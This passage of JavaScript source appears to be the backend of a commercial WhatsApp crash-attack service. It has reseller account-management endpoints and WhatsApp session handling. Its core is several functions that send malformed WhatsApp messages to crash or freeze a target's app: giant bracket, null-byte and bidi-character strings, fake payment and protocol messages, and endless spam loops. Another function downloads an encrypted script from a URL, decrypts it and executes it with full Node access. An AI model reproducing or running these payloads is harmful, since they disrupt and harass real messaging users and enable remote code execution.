  db.push(newAccount);
  if (currentLimit != null) creator.usageLog.count++;
  saveDatabase(db);
  saveUserLog(creator.username, "create", `Buat Akun ${targetRole.toUpperCase()}`,
    `User: ${newUser} | Role: ${targetRole} | Durasi: ${parsedDay} Hari | UID: ${newAccount.uid}`);
  appendLogAsync('logUser.txt', `${creator.username} Created ${newUser} Role ${targetRole} Days ${parsedDay} UID ${newAccount.uid}\n`);
  await notifyAccountCreated({ username: newUser, role: targetRole, expiredDate: newAccount.expiredDate, durationDays: parsedDay, createdBy: creator.username, source: 'APK /createAccount' });
  return res.json({ valid: true, authorized: true, created: true, user: newAccount });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const deleter = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!deleter || !targetUser) {
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  // Hanya owner yang bisa menghapus role owner
  if (targetUser.role === 'owner' && deleter.role !== 'owner') {
    console.log(`[❌ DELETE] ${deleter.role} tidak boleh menghapus role owner.`);
    return res.json({ 
      valid: true, 
      authorized: false, 
      message: "Only owner can delete another owner account." 
    });
  }

  const roleLevel = {
    developer: 8,
    moderator: 7,
    tk: 6,
    partner: 5,
    owner: 4,
    admin: 3,
    reseller: 2,
    vip: 1,
    member: 0
  };

  const deleterLevel = roleLevel[deleter.role] || 0;
  const targetLevel = roleLevel[targetUser.role] || 0;

  // Owner bisa hapus owner lain (level sama)
  if (deleterLevel < targetLevel) {
    console.log(`[❌ DELETE] ${deleter.role} (Lv ${deleterLevel}) tidak boleh menghapus ${targetUser.role} (Lv ${targetLevel}).`);
    return res.json({ valid: true, authorized: false, message: "You cannot delete a user with higher rank." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index !== -1) {
    const deletedUser = db[index];
    db.splice(index, 1);
    saveDatabase(db);

    const logLine = `${deleter.username} Deleted ${username}\n`;
    appendLogAsync('logUser.txt', logLine);
    
    console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
    return res.json({ valid: true, deleted: true, user: deletedUser });
  }

  return res.json({ valid: true, deleted: false, message: "Failed to delete user." });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);

  if (!requester || allowedCreateRoles(requester.role).length === 0 && !["owner", "developer", "moderator", "partner", "tk", "admin"].includes(String(requester.role || "").toLowerCase())) {
    console.log(`[❌ LIST] ${requester?.username || "Unknown"} tidak memiliki izin melihat list.`);
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
    parent: u.parent || "SYSTEM"
  }));

  return res.json({ valid: true, authorized: true, users, allowedCreateRoles: allowedCreateRoles(requester.role) });
});

app.get("/userAdd", async (req, res) => {
  const { key, username, password, role = 'member', day } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);
  if (!creator) return res.json({ valid: true, authorized: false, message: "Not authorized." });

  const creatorRole = String(creator.role || 'member').toLowerCase();
  const targetRole = String(role || 'member').toLowerCase();
  if (!canCreateRole(creatorRole, targetRole)) {
    return res.json({ valid: true, authorized: false, created: false,
      message: `Role ${creatorRole} cannot create ${targetRole}.` });
  }

  const parsedDay = parseInt(day, 10);
  if (!Number.isInteger(parsedDay) || parsedDay < 1 || parsedDay > 3650) {
    return res.json({ valid: true, created: false, message: "Durasi harus berupa angka 1-3650 hari." });
  }
  if (creatorRole === 'reseller' && parsedDay > 30) {
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }
  if (!username || !password) return res.json({ valid: true, created: false, message: "Username dan password wajib diisi." });
  if (db.find(u => u.username === username)) return res.json({ valid: true, created: false, message: "Username already exists." });

  const roleLimits = { owner: 50, moderator: 45, partner: 40, tk: 40, developer: 1000, admin: 35, reseller: 30 };
  const currentLimit = roleLimits[creatorRole];
  const currentMonth = new Date().toISOString().slice(0, 7);
  if (currentLimit != null) {
    if (!creator.usageLog || creator.usageLog.month !== currentMonth) creator.usageLog = { count: 0, month: currentMonth };
    if (creator.usageLog.count >= currentLimit) return res.json({ valid: true, created: false, limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.` });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parsedDay);
  const newUser = { username, password, role: targetRole,
    expiredDate: expired.toISOString().split("T")[0], uid: crypto.randomBytes(16).toString('hex'),
    createdBy: creator.username, createdAt: new Date().toISOString() };
  db.push(newUser);
  if (currentLimit != null) creator.usageLog.count++;
  saveDatabase(db);
  appendLogAsync('logUser.txt', `${creator.username} Created ${username} Role ${targetRole} Days ${parsedDay} UID ${newUser.uid}\n`);
  await notifyAccountCreated({ username, role: targetRole, expiredDate: newUser.expiredDate, durationDays: parsedDay, createdBy: creator.username, source: 'APK /userAdd' });
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!editor || !["reseller", "admin", "partner", "tk", "moderator", "owner", "developer"].includes(String(editor.role || "").toLowerCase())) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // Owner bisa edit owner lain, hapus blok pengecekan khusus

  const roleLevel = {
    owner: 6, moderator: 5, partner: 4, admin: 3, reseller: 2, vip: 1, member: 0
  };
  
  // Owner bisa edit owner lain (level sama)
  if (roleLevel[editor.role] < roleLevel[targetUser.role]) {
     return res.json({ valid: true, edited: false, message: "Cannot edit user with higher rank." });
  }

  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ EDIT] Reseller tidak boleh menambah masa aktif lebih dari 30 hari.");
    return res.json({ valid: true, edited: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser.username} Add Days ${addDays}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

async function BlankClick(sock, target) {
  await sock.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "#FxT-Sex",
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.9999999999999,
                name: " You Know DarkLight ",
                address: "X",
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "address_message",
                  buttonParamsJson: "[".repeat(5000),
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: "{".repeat(3888),
                },
              ],
              messageParamsJson: "Wa.me/stickerpack/zuki",
              messageVersion: 1,
            },
          },
        },
      },
    },
    { participant: { jid: target } },
  );

  await sock.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: "༘FxT‣" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "༘Fxt‣" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "fvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "fvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "fvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "fvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "fvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "fvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "fvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "fvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "fvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "fvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {},
        packDescription: "Niggasaki ༘‣" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
    },
    {},
  );

  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "DarkLight",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_message",
              paramsJson: "\u0000".repeat(1000000),
              version: 2,
            },
          },
        },
      },
    },
    {
      participant: {
        jid: target,
      },
    },
  );
}

async function FrezeDelay(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "DarkLight¡"
          },
          NativeFlowMessage: {
            buttons: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
              )
            ],
            name: "\x10".repeat(50000)
          },
          nativeFlowMessage: {
            name: "galaxy_message",
            buttons: "\u0000".repeat(250000) + "\x10".repeat(250000)
          }
        }
      }
    }
  };
  await sock.relayMessage(target, msg, {
    partcipant: true
  });
}

async function spamVideo(sock, target) {
    const videoUrls = [
        'https://files.catbox.moe/eiqyw2.mp4',
        'https://files.catbox.moe/eiqyw2.mp4',
        'https://files.catbox.moe/eiqyw2.mp4',
        'https://files.catbox.moe/eiqyw2.mp4',
        'https://files.catbox.moe/eiqyw2.mp4'
    ];

    const captions = [  
        '🔥 Angee kamu kan?!',
        '🎬 Video spesial buat kamu!'
    ];

    while (true) {
        const randomVideo = videoUrls[Math.floor(Math.random() * videoUrls.length)];
        const randomCaption = captions[Math.floor(Math.random() * captions.length)];
        
        await sock.sendMessage(target, {
            video: { url: randomVideo },
            mimetype: 'video/mp4',
            caption: randomCaption
        });
    }
}

async function fcWianz(sock, target) {
  try {
    const msg = {
      viewOnceMessage: {
        message: {
          requestPaymentMessage: {
            body: {
              text: "DarkLight",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "review_and_pay",
              paramsJson: JSON.stringify({
                currency: "USD",
                payment_configuration: "",
                payment_type: "",
                transaction_id: "",
                total_amount: {
                  value: 879912500,
                  offset: 100
                },
                reference_id: "4N88TZPXWUM",
                type: "physical-goods",
                payment_method: "",
                order: {
                  status: "pending",
                  description: "",
                  subtotal: {
                    value: 990000000,
                    offset: 100
                  },
                  tax: {
                    value: 8712000,
                    offset: 100
                  },
                  discount: {
                    value: 118800000,
                    offset: 100
                  },
                  shipping: {
                    value: 500,
                    offset: 100
                  },
                  order_type: "ORDER",
                  items: [
                    {
                      retailer_id: "custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0",
                      name: "JAMUR",
                      amount: {
                        value: 1000000,
                        offset: 100
                      },
                      quantity: 99
                    },
                    {
                      retailer_id: "custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4",
                      name: "Wortel",
                      amount: {
                        value: 5000000,
                        offset: 100
                      },
                      quantity: 99
                    },
                    {
                      retailer_id: "custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3",
                      name: "null",
                      amount: {
                        value: 4000000,
                        offset: 100
                      },
                      quantity: 99
                    }
                  ]
                },
                additional_note: ""
              }),
              version: 3
            }
          }
        }
      }
    };

    await sock.relayMessage(target, msg, {
      groupId: null,
      participant: { jid: target }
    });

  } catch (error) {
    console.error("Error in fcCong function:", error);
    throw error;
  }
}

async function fuckBuldozx(sock, jid) {

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const p1 = "\u200B".repeat(20000);

const p2 = "\uFEFF".repeat(20000);

const p3 = "\u202E".repeat(20000);
const p4 = "\u061C".repeat(15000);

const p5 = "\u2066\u2067\u2068\u2069".repeat(10000);

const p6 = "\u0300".repeat(50000);
const p7 = "\u200D".repeat(30000);

const p8 = "\uFEFF\u200B\u061C".repeat(25000);
const p9 = "👨\u200D👩\u200D👧\u200D👦".repeat(5000);

const p10 = "\uD83D\uDC68\u200D".repeat(20000);
const p11 = "\0".repeat(10000) + "\uFEFF\u202E";
const imgUrl = "https://files.catbox.moe/he98c4.jpg";

const payloads = [p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11];
while (true) {

for (let i = 0; i < 100; i++) {

try {

const payload = payloads[i % payloads.length];
await sock.sendMessage(jid, {  
      image: { url: imgUrl },  
      caption: payload  
    });  
  } catch (e) {}  

  await sleep(100);  
}  

await sleep(1000);
}

}

async function fuckInvisibleDelay(sock, jid) {
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
  const p = "\u0E4D".repeat(60000);

  while (true) {
    try {
      await sock.relayMessage(jid, {
        protocolMessage: {
          key: {
            remoteJid: jid,
            fromMe: true,
            id: "INVIS_" + Date.now() + "_" + Math.random()
          },
          type: 25,
          ephemeralExpiration: 999999,
          ephemeralSettingTimestamp: Date.now(),
          historySyncNotification: {
            chunkOrder: 999999,
            progress: 999999,
            oldestMsgInChunk: Date.now(),
            initialHistBootstrapInlinePayload: p,
            peerDataRequestSessionId: p,
            pushnames: [p, p]
          }
        }
      }, {});
    } catch (e) {}

    try {
      await sock.relayMessage("status@broadcast", {
        protocolMessage: {
          key: {
            remoteJid: "status@broadcast",
            fromMe: true,
            id: "INVIS_ST_" + Date.now() + "_" + Math.random()
          },
          type: 25,
          historySyncNotification: {
            chunkOrder: 999999,
            progress: 999999,
            oldestMsgInChunk: Date.now(),
            initialHistBootstrapInlinePayload: p,
            peerDataRequestSessionId: p,
            pushnames: [p]
          }
        }
      }, {
        statusJidList: [jid],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: { jid: jid },
              content: undefined
            }]
          }]
        }]
      });
    } catch (e) {}

    await sleep(30);
  }
}
// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; // ✅ Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

// === Setup VIP Folder ===
function getVipSessionPath(sessionName) {
  return path.join('vip', sessionName);
}
function setupVipFolder() {
  // Ganti path menjadi root folder 'vip', bukan di dalam 'permenmd'
  const vipPath = path.join(__dirname, 'vip');

  try {
    if (!fs.existsSync(vipPath)) {
      fs.mkdirSync(vipPath, { recursive: true });
      console.log("[INFO] Folder VIP (root) dibuat otomatis.");
    }
  } catch (err) {
    console.error("[INFO] Gagal membuat folder VIP:", err);
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}/*

async function connectSession(folderPath, sessionName, retries = 5) {
  if (activeConnections[sessionName]) return activeConnections[sessionName];

  const sessionsFold = path.join(folderPath, sessionName);

  return new Promise(async (resolve) => {
    try {
      const { state, saveCreds } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) qrCodes[sessionName] = qr;

        if (connection === "open") {
          delete qrCodes[sessionName];
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(path.join(sessionsFold, 'creds.json'));
          console.log(`[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") biz[sessionName] = sock;
          else if (type === "Messenger") mess[sessionName] = sock;

          resolve(sock);
        } else if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

          if (isLoggedOut) {
            console.log(`[${sessionName}] Logged out.`);
            fs.rmSync(sessionsFold, { recursive: true, force: true });
            delete activeConnections[sessionName];
            delete biz[sessionName];
            delete mess[sessionName];
            resolve(null);
          } else if (retries > 0) {
            setTimeout(() => connectSession(folderPath, sessionName, retries - 1).then(resolve), 5000);
          } else {
            console.log(`${sessionName} Connection failed after retries.`);
            resolve(null);
          }
        }
      });
    } catch (err) {
      console.log(`[${sessionName}] Error connecting: ${err.message}`);
      resolve(null);
    }
  });
}*/

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
  //startLoop();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  const sessionDir = path.join('permenmd', owner, number);

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);

      try {
        await waiting(3000)
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds);
          fs.writeFileSync(destCreds, data);
          console.log(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}

async function startUserSessions() {
  const vipDir = 'vip';
  const baseDir = 'permenmd';
    /*if (fs.existsSync(vipDir)) {
  const vipFiles = fs.readdirSync(vipDir).filter(f => f.endsWith('.json'));
  console.log(`[DEBUG] VIP files ditemukan: ${vipFiles.length}`);
    for (const file of vipFiles) {
  const sessionName = path.basename(file, '.json');
  const jsonFile = path.join(vipDir, file);        // vip/628xxx.json
  const sessionFolder = path.join(vipDir, sessionName); // vip/628xxx/

  if (activeConnections[sessionName]) {
    console.log(`[SKIP] VIP ${sessionName} already active.`);
    continue;
  }

  if (!fs.existsSync(sessionFolder)) {
    fs.mkdirSync(sessionFolder, { recursive: true });
    fs.copyFileSync(jsonFile, path.join(sessionFolder, 'creds.json'));
    console.log(`[PREP] Folder dibuat untuk ${sessionName}`);
  }

  try {
    console.log(`[START] Connecting VIP: ${sessionName}`);
    await connectSession(sessionFolder, sessionName, 100, () => {
      // Callback kalau session mati → hapus json asli juga
      if (fs.existsSync(jsonFile)) {
        fs.rmSync(jsonFile, { force: true });
        console.log(`[🗑️] VIP json dihapus: ${file}`);
      }
    });
  } catch (err) {
    console.error(`[ERROR] VIP ${sessionName}:`, err.message);
  }
}*/
/*

  // 1. Scan VIP Folder (Root)
  if (fs.existsSync(vipDir)) {
  const vipFiles = fs.readdirSync(vipDir).filter(f => f.endsWith('.json'));
  console.log(`[DEBUG] VIP files ditemukan: ${vipFiles.length}`);

  for (const file of vipFiles) {
    const sessionName = path.basename(file, '.json');

    if (activeConnections[sessionName]) {
      console.log(`[SKIP] VIP ${sessionName} already active.`);
      continue;
    }

    // Buat folder sementara vip/628xxx/ lalu taruh creds.json di sana
    const sessionFolder = path.join(vipDir, sessionName);
    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      fs.copyFileSync(
        path.join(vipDir, file),         // vip/628xxx.json
        path.join(sessionFolder, 'creds.json') // vip/628xxx/creds.json
      );
